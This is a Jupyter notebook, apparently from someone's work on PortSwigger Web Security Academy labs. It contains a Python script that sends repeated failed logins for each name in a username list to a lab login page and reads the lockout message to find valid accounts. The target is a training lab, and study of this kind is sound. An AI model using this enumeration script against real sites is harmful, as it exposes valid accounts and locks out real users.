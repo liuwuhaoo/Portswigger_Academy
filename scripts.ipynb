{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "us_f = open(\"/home/sueaki/Templates/username\", \"r\")\n",
    "usernames = us_f.readlines()\n",
    "# ps_f = open(\"password\", \"r\")\n",
    "# passwords = ps_f.readlines()\n",
    "# ps_t = open(\"password_tmp\", \"w\")\n",
    "# us_t = open(\"username_tmp\", \"w\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "url = 'https://0a7c0051045b95cf81b74d4c0034003f.web-security-academy.net/login'\n",
    "for user in usernames:\n",
    "    for i in range(5):\n",
    "        data = {\n",
    "            'username': user[:-1],\n",
    "            'password': 'whatever'\n",
    "        }\n",
    "        response = requests.post(url, data=data)\n",
    "\n",
    "        print(f\"Status Code: {response.status_code}\", end='. ')\n",
    "        # print(f\"Response Content: {response.text}\")\n",
    "        # print(user, end='')\n",
    "        print(len(response.text), end=\".\")\n",
    "        if (\"Invalid username or password.\" in response.text):\n",
    "            # print(\"Invalid username or password\")\n",
    "            print(user)\n",
    "        elif (\"You have made too many incorrect login attempts\" in response.text):\n",
    "            print(\"Also Found it: \", user)\n",
    "        else:\n",
    "            print(\"Found it: \", user)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
